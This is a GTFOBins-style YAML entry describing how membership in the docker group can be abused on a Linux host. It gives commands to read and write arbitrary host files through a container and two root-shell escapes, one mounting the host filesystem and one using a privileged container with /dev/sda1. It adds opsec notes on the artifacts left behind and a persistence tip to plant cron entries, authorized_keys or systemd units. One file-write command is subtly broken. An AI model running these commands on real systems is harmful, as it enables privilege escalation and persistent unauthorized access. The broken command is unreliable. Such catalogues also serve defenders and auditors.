---
name: docker
capabilities:
- exec
- spawn
- read
- write
required_permissions:
  level: user
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  - File timestamps / inotify events on target paths
  notes: This requires the user to be privileged enough to run `docker`, e.g., being in the `docker` group or being `root`.
persistence_potential: true
examples:
- id: file-read
  description: Read an arbitrary file.
  capabilities:
  - read
  command: |-
    docker cp /path/to/input-file $CONTAINER_ID:input-file
    docker cp $CONTAINER_ID:input-file /path/to/temp-file
    cat /path/to/temp-file
  notes: Read a file by copying it to a temporary container (`$CONTAINER_ID`) and back to a new location on the host.
- id: file-write
  description: Write content to an arbitrary file.
  capabilities:
  - write
  command: |-
    echo DATA >/path/to/temp-file
    docker cp /path/to/temp-file $CONTAINER_ID:temp-file
    docker cp $CONTAINER_ID /path/to/output-file
  notes: Write a file by copying it to a temporary container (`$CONTAINER_ID`) and back to the target destination on the host.
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
- id: shell-2
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: |-
    docker run --rm -it --privileged -u root alpine
    mount /dev/sda1 /mnt/
    ls -la /mnt/
    chroot /mnt /bin/bash
  notes: This exploits the fact that is run with the `--privileged` option to directly mount a host's disk, e.g., `/dev/sda1`.
references:
- https://gtfobins.github.io/gtfobins/docker/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
